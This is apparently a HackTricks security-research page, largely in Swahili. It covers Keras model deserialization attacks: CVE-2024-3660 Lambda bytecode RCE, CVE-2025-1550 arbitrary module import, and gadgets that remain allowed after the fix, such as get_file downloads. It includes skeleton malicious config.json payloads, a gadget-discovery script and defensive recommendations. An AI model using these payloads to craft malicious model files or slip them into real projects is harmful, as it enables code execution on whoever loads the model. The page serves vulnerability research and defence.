# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa mbinu za vitendo za unyakuzi dhidi ya pipeline ya deserialization ya modeli ya Keras, unaelezea ndani ya muundo wa .keras na uso wa shambulio, na unatoa zana za utafiti za kutafuta Uthibitisho wa Faili za Modeli (MFVs) na vifaa vya baada ya kurekebisha.

## .keras model format internals

Faili ya .keras ni archive ya ZIP inayojumuisha angalau:
- metadata.json – taarifa za jumla (mfano, toleo la Keras)
- config.json – muundo wa modeli (uso wa shambulio wa msingi)
- model.weights.h5 – uzito katika HDF5

config.json inaendesha deserialization ya kurudi: Keras inaagiza moduli, inatatua madarasa/funzo na inajenga tena tabaka/vitu kutoka kwa kamusi zinazodhibitiwa na mshambuliaji.

Mfano wa kipande kwa kitu cha tabaka la Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization inatekeleza:
- Kuagiza moduli na kutatua alama kutoka kwa funguo za moduli/class_name
- from_config(...) au mwito wa mjenzi na kwargs zinazodhibitiwa na mshambuliaji
- Kurudi kwenye vitu vilivyo ndani (activations, initializers, constraints, nk.)

Kihistoria, hii ilifunua primitives tatu kwa mshambuliaji anayekunda config.json:
- Udhibiti wa moduli zipi zinazoagizwa
- Udhibiti wa ni madarasa/mifunction gani zinazoamuliwa
- Udhibiti wa kwargs zinazopitishwa kwenye wajenzi/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Sababu ya msingi:
- Lambda.from_config() ilitumia python_utils.func_load(...) ambayo inafanya base64-decode na kuita marshal.loads() kwenye bytes za mshambuliaji; Python unmarshalling inaweza kutekeleza msimbo.

Wazo la kutumia (payload iliyo rahisishwa katika config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras inatekeleza safe_mode=True kama chaguo la default. Mifano ya Python iliyohifadhiwa katika Lambda inazuia isipokuwa mtumiaji aondoe wazi kwa safe_mode=False.

Notes:
- Mifumo ya zamani (hifadhi za HDF5 za zamani) au misimbo ya zamani inaweza isitekeleze ukaguzi wa kisasa, hivyo mashambulizi ya “downgrade” yanaweza bado kutumika wakati waathirika wanatumia loaders za zamani.

## CVE-2025-1550 – Uagizaji wa moduli zisizo na mipaka katika Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn ilitumia importlib.import_module() isiyo na mipaka na nyuzi za moduli zinazodhibitiwa na mshambuliaji kutoka config.json.
- Impact: Uagizaji wa kiholela wa moduli yoyote iliyosakinishwa (au moduli iliyopandikizwa na mshambuliaji kwenye sys.path). Msimbo wa wakati wa uagizaji unakimbia, kisha ujenzi wa kitu unafanyika na kwargs za mshambuliaji.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: deserialized objects must match expected types

## Post-fix gadget surface inside allowlist

Hata na allowlisting na safe mode, uso mpana unabaki kati ya Keras callables zinazoruhusiwa. Kwa mfano, keras.utils.get_file inaweza kupakua URLs zisizo na mipaka kwenye maeneo yanayoweza kuchaguliwa na mtumiaji.

Gadget kupitia Lambda inayorejelea kazi inayoruhusiwa (siyo serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Important limitation:
- Lambda.call() inajumuisha tensor ya ingizo kama hoja ya kwanza ya nafasi wakati inaita callable lengwa. Gadgets zilizochaguliwa zinapaswa kuvumilia hoja ya ziada ya nafasi (au kukubali *args/**kwargs). Hii inakandamiza kazi zipi zinaweza kutumika.

Potential impacts of allowlisted gadgets:
- Kupakua/kandika bila mipaka (kupanda njia, kuharibu usanidi)
- Mkurugenzi wa mtandao/madhara kama ya SSRF kulingana na mazingira
- Kuunganisha kwa utekelezaji wa msimbo ikiwa njia zilizokandikwa zitaagizwa/kuendeshwa baadaye au kuongezwa kwenye PYTHONPATH, au ikiwa kuna mahali pa kuandika ambapo utekelezaji unafanyika

## Researcher toolkit

1) Ugunduzi wa gadget wa kimfumo katika moduli zilizoruhusiwa

Taja callables za wagombea katika keras, keras_nlp, keras_cv, keras_hub na uweke kipaumbele kwa wale wenye madhara ya faili/mtandao/mchakato/mazingira.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Upimaji wa moja kwa moja wa deserialization (hakuna archive ya .keras inahitajika)

Ingiza dicts zilizoundwa moja kwa moja kwenye deserializers za Keras ili kujifunza vigezo vinavyokubalika na kuangalia athari za upande.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Uchunguzi wa toleo tofauti na muundo

Keras ipo katika misingi tofauti ya kanuni/mizani na muundo tofauti:
- Keras iliyo ndani ya TensorFlow: tensorflow/python/keras (urithi, inatarajiwa kufutwa)
- tf-keras: inatunzwa tofauti
- Keras 3 ya Multi-backend (rasmi): ilianzisha .keras asilia

Rudia majaribio kati ya misingi ya kanuni na muundo (.keras dhidi ya urithi HDF5) ili kugundua kurudi nyuma au ulinzi unaokosekana.

## Mapendekezo ya kujihami

- Chukulia faili za modeli kama ingizo lisiloaminika. Pakua tu modeli kutoka vyanzo vinavyoaminika.
- Hifadhi Keras kuwa wa kisasa; tumia Keras ≥ 3.9 ili kufaidika na orodha za ruhusa na ukaguzi wa aina.
- Usisete safe_mode=False unapopakua modeli isipokuwa unamwamini kabisa faili hiyo.
- Fikiria kuendesha deserialization katika mazingira yaliyofungwa, yenye mamlaka madogo bila kutoka mtandao na kwa ufikiaji wa mfumo wa faili ulio na mipaka.
- Lazimisha orodha za ruhusa/saini kwa vyanzo vya modeli na ukaguzi wa uaminifu inapowezekana.

## Marejeleo

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
